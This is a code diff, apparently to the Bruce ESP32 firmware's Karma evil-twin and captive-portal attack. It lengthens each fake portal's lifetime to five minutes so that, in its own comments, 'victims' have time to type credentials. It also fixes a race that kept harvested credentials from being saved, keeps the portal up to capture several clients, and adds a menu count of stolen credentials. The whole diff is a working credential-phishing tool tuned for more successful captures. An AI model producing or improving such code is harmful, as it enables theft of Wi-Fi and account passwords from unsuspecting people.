@@ -130,7 +130,12 @@ const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
 #define LISTEN_WINDOW 250
 #define KARMA_QUEUE_DEPTH 48
 #define PORTAL_HEARTBEAT_INTERVAL 500
-#define PORTAL_MAX_IDLE 60000
+// How long a single ESSID's portal stays up before Karma moves to the next one.
+// Victims need time to read the page and type credentials, so this is the knob
+// that decides whether a capture succeeds at all.
+#define KARMA_PORTAL_DWELL_MS 300000
+// Keep the on-screen countdown in sync with the real teardown deadline.
+#define PORTAL_MAX_IDLE KARMA_PORTAL_DWELL_MS
 
 const uint8_t vendorOUIs[][3] PROGMEM = {
     {0x00, 0x50, 0xF2},
@@ -841,6 +846,45 @@ void savePortalCredentials(
         );
         logFile.close();
     }
+}
+
+// Counts captured credentials across /BruceEvilCreds/*.csv.
+//
+// That directory is written by EvilPortal::saveToCSV(), one appended line per
+// submitted form, so the line count is the capture count. The Karma menu used
+// to report only on /PortalCreds, which meant it showed "no captures" even when
+// credentials were being harvested correctly.
+static size_t countEvilPortalCreds() {
+    FS *fs = nullptr;
+    if (!getFsStorage(fs)) return 0;
+    if (!fs->exists("/BruceEvilCreds")) return 0;
+
+    File dir = fs->open("/BruceEvilCreds");
+    if (!dir) return 0;
+    if (!dir.isDirectory()) {
+        dir.close();
+        return 0;
+    }
+
+    size_t total = 0;
+    uint8_t buf[128];
+    File entry = dir.openNextFile();
+    while (entry) {
+        String name = String(entry.name());
+        name.toLowerCase();
+        if (!entry.isDirectory() && name.endsWith(".csv")) {
+            int n;
+            while ((n = entry.read(buf, sizeof(buf))) > 0) {
+                for (int i = 0; i < n; i++) {
+                    if (buf[i] == '\n') total++;
+                }
+            }
+        }
+        entry.close();
+        entry = dir.openNextFile();
+    }
+    dir.close();
+    return total;
 }
 
 String generateUniqueFilename(FS &fs, bool compressed) {
@@ -1705,49 +1749,18 @@ void checkPortals() {
         return;
     }
 
-    if (activePortal->instance != nullptr) {
-        activePortal->instance->checkAndExtendDuration();
+    activePortal->instance->checkAndExtendDuration();
 
-        unsigned long portalAge = now - activePortal->launchTime;
-
-        // If we got credentials, terminate immediately
-        if (activePortal->instance->hasCredentials()) {
-            destroyActivePortal();
-            lastPortalHeartbeat = now;
-            return;
-        }
-
-        // Check if target is engaged (viewed portal recently)
-        bool targetEngaged = activePortal->instance->hasRecentPageView();
-
-        if (targetEngaged) {
-            // Target is actively viewing the portal - keep alive
-            // 3 minute absolute safety cap (180,000 ms)
-            if (portalAge > 180000) { // 3 minutes max
-                destroyActivePortal();
-                lastPortalHeartbeat = now;
-                return;
-            }
-            // Portal stays alive - no timeout when engaged
-        } else {
-            // No engagement - short 15 second timeout
-            if (portalAge > attackConfig.baseDuration) { // 15000 ms (15 seconds)
-                destroyActivePortal();
-                lastPortalHeartbeat = now;
-                return;
-            }
-        }
-    }
-
-    if (channl != activePortal->channel - 1) {
-        channl = activePortal->channel - 1;
-        setChannelWithSecond(activePortal->channel);
-    }
-
-    activePortal->instance->processRequests();
-    activePortal->lastHeartbeat = now;
-
-    if (activePortal->instance->hasCredentials()) {
+    // Persist credentials as soon as they appear.
+    //
+    // This block used to live at the very end of the function, behind an
+    // "if (hasCredentials()) { destroyActivePortal(); return; }" early return.
+    // ESPAsyncWebServer raises that flag from its own task at an arbitrary
+    // moment between heartbeats, so the early return always won the race and
+    // savePortalCredentials() was effectively dead code -- /PortalCreds was
+    // never even created. Captures only survived because EvilPortal separately
+    // writes /BruceEvilCreds/<template>_creds.csv from credsController().
+    if (activePortal->instance->hasCredentials() && !activePortal->hasCreds) {
         activePortal->hasCreds = true;
         activePortal->capturedPassword = activePortal->instance->getCapturedPassword();
         savePortalCredentials(
@@ -1759,11 +1772,25 @@ void checkPortals() {
             activePortal->instance->getApName(),
             activePortal->portalId
         );
+    }
+
+    // One predictable deadline instead of the old 15s / 30s-since-page-view
+    // pair. The portal is no longer torn down on the first capture either, so
+    // more than one client on the same ESSID can be served, and it no longer
+    // disappears while a victim is still typing.
+    if (now - activePortal->launchTime > attackConfig.baseDuration) {
         destroyActivePortal();
         lastPortalHeartbeat = now;
         return;
     }
 
+    if (channl != activePortal->channel - 1) {
+        channl = activePortal->channel - 1;
+        setChannelWithSecond(activePortal->channel);
+    }
+
+    activePortal->instance->processRequests();
+    activePortal->lastHeartbeat = now;
     lastPortalHeartbeat = now;
 }
 
@@ -2084,7 +2111,9 @@ void checkPendingPortals() {
         std::remove_if(
             pendingPortals.begin(),
             pendingPortals.end(),
-            [now](const PendingPortal &p) { return (now - p.timestamp > 300000); }
+            // Each portal now occupies a full KARMA_PORTAL_DWELL_MS slot, so a
+            // 5 minute expiry drained the queue faster than it could be served.
+            [now](const PendingPortal &p) { return (now - p.timestamp > 900000); }
         ),
         pendingPortals.end()
     );
@@ -2661,8 +2690,8 @@ void karma_setup() {
     attackConfig.fastTierDuration = 15000;
     attackConfig.cloneDuration = 90000;
     attackConfig.maxCloneNetworks = 2;
-    attackConfig.baseDuration = 15000;
-    attackConfig.extendedDuration = 180000;
+    attackConfig.baseDuration = KARMA_PORTAL_DWELL_MS;
+    attackConfig.extendedDuration = KARMA_PORTAL_DWELL_MS;
 
     handshakeCaptureEnabled = false;
 
@@ -3210,7 +3239,19 @@ void karma_setup() {
 
                 {"View Captures",
                  [&]() {
+                     // Built before the vector so the label outlives loopOptions().
+                     String credsLabel = "Creds: " + String(countEvilPortalCreds());
                      std::vector<Option> viewOptions = {
+                         {credsLabel.c_str(),
+                 [&]() {
+                              FS *fs;
+                              if (getFsStorage(fs) && fs->exists("/BruceEvilCreds")) {
+                                  loopSD(*fs, false, "CSV", "/BruceEvilCreds");
+                              } else {
+                                  displayTextLine("No captures yet");
+                                  delay(1000);
+                              }
+                          }},
                          {"Portal Creds",
                  [&]() {
                               FS *fs;
